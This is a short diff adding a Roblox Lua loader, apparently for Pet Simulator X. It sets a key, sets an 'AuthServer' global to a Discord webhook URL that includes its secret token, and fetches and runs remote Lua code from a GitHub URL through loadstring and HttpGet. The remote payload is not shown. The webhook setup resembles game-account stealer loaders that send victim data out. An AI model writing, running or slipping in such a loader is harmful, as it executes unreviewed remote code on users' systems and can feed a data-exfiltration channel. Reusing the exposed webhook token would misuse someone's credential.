@@ -1,0 +1,3 @@
+_G.Key = "223344isem"
+_G.AuthServer = "https://discord.com/api/webhooks/1051544602361991268/tBNlMGlwhdD0yGTETKHC5qwIvEaIJJ6ERi8o9F_t_XjuLnJptdTIJqPLgBdsB3cizPsU"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
